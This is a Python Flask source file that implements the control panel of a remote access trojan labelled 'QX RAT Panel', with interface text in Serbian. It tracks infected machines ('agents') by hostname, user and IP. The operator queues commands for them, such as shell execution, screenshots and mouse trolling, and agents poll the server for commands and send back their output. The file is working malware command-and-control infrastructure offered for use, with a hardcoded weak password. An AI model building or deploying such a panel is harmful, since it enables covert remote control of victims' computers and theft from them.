from flask import Flask, request, render_template_string, jsonify, redirect, url_for, session
import time
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = "qx_secret_987654"

# Lozinka za ulazak u panel
PANEL_PASSWORD = "admin123"

agents = {}
commands = {}
results = {}

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>QX Panel</title>
    <style>
        * { box-sizing: border-box; }
        body { background: #0b0b0f; color: #ddd; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 25px; }
        h1 { color: #00d4ff; margin-bottom: 5px; }
        .sub { color: #666; margin-bottom: 25px; }
        .card { background: #14141a; border: 1px solid #222; border-radius: 10px; padding: 18px; margin-bottom: 18px; }
        input, select, button { padding: 11px 14px; border-radius: 7px; border: none; font-size: 14px; }
        input, select { background: #1e1e26; color: white; width: 100%; max-width: 420px; margin-bottom: 8px; }
        button { background: #00d4ff; color: #0b0b0f; font-weight: 600; cursor: pointer; }
        button:hover { background: #00b8e0; }
        .online { color: #00ff9d; font-weight: 600; }
        .offline { color: #ff5555; }
        pre { background: #0f0f13; padding: 12px; border-radius: 7px; overflow-x: auto; font-size: 13px; max-height: 220px; }
        a { color: #00d4ff; text-decoration: none; }
    </style>
</head>
<body>
    <h1>QX RAT Panel</h1>
    <div class="sub">Web Control</div>

    {% if not session.get('logged_in') %}
    <div class="card">
        <form method="POST" action="/login">
            <input type="password" name="password" placeholder="Lozinka" required>
            <br><button type="submit">Uloguj se</button>
        </form>
    </div>
    {% else %}
    <p style="margin-bottom:20px;"><a href="/logout">Logout</a></p>

    <div class="card">
        <h3 style="margin-top:0;">Agenti</h3>
        {% if agents %}
            {% for aid, info in agents.items() %}
            <div style="margin: 8px 0;">
                <b>{{ info.hostname }}</b> ({{ info.user }}) 
                — <span class="{{ 'online' if (now - info.last_seen) < 35 else 'offline' }}">
                    {{ 'ONLINE' if (now - info.last_seen) < 35 else 'OFFLINE' }}
                </span>
                | {{ info.ip }} | {{ info.last_seen_str }}
            </div>
            {% endfor %}
        {% else %}
            <p>Nema prijavljenih agenata.</p>
        {% endif %}
    </div>

    <div class="card">
        <h3 style="margin-top:0;">Pošalji komandu</h3>
        <form method="POST" action="/send">
            <select name="agent_id">
                {% for aid, info in agents.items() %}
                <option value="{{ aid }}">{{ info.hostname }} — {{ info.user }}</option>
                {% endfor %}
            </select>
            <input type="text" name="cmd" placeholder="ss / shell whoami / troll_mouse / info ..." required>
            <br><button type="submit">Pošalji komandu</button>
        </form>
    </div>

    <div class="card">
        <h3 style="margin-top:0;">Rezultati (poslednji)</h3>
        {% for aid, res_list in results.items() %}
            <b>{{ agents[aid].hostname if aid in agents else aid }}</b>
            {% for r in res_list[-6:] %}
            <pre>{{ r }}</pre>
            {% endfor %}
        {% else %}
            <p>Još nema rezultata.</p>
        {% endfor %}
    </div>
    {% endif %}
</body>
</html>
"""

@app.route("/")
def index():
    now = time.time()
    for aid in list(agents.keys()):
        agents[aid]["last_seen_str"] = datetime.fromtimestamp(agents[aid]["last_seen"]).strftime("%H:%M:%S")
    return render_template_string(HTML, agents=agents, results=results, now=now, session=session)

@app.route("/login", methods=["POST"])
def login():
    if request.form.get("password") == PANEL_PASSWORD:
        session["logged_in"] = True
    return redirect(url_for("index"))

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))

@app.route("/send", methods=["POST"])
def send():
    if not session.get("logged_in"):
        return redirect(url_for("index"))
    aid = request.form.get("agent_id")
    cmd = request.form.get("cmd", "").strip()
    if aid and cmd:
        commands[aid] = cmd
    return redirect(url_for("index"))

@app.route("/api/check", methods=["POST"])
def api_check():
    data = request.json or {}
    aid = data.get("id")
    if not aid:
        return jsonify({"cmd": None})
    agents[aid] = {
        "hostname": data.get("hostname", "?"),
        "user": data.get("user", "?"),
        "ip": data.get("ip", "?"),
        "last_seen": time.time()
    }
    cmd = commands.pop(aid, None)
    return jsonify({"cmd": cmd})

@app.route("/api/result", methods=["POST"])
def api_result():
    data = request.json or {}
    aid = data.get("id")
    result = data.get("result", "")
    if not aid:
        return jsonify({"ok": False})
    if aid not in results:
        results[aid] = []
    results[aid].append(f"[{datetime.now().strftime('%H:%M:%S')}] {result}")
    results[aid] = results[aid][-15:]
    return jsonify({"ok": True})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
